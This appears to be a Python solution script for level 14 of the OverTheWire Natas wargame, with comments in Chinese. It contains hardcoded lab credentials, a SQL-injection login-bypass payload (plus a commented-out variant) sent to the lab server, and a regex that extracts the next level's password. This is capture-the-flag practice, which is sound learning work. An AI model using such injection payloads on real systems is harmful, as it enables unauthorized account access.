#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests as req
import re


# TODO: Upload file && see source code.
user = "natas14"
passwd = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

viewSourceCode = 'index-source.html'

# ? 在 GET method 的 array 中如果有抓到 debug 這個 key 就會顯示"Executing query: "
url = f"http://{user}.natas.labs.overthewire.org/?debug=debug"

# ? 兩種方法都可
# data = {"username": "admin", "password": "\" or 1=1 # "}
data = {"username": "admin\" or 1=1 #", "password": "123"}

response = req.post(url, auth=(user, passwd), data=data)

content = response.text

with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
    print(content, file=f)


# TODO: Get the answer
answer = re.findall(
    "Successful login! The password for natas15 is (.*)<br>", content)[0]
print(answer)
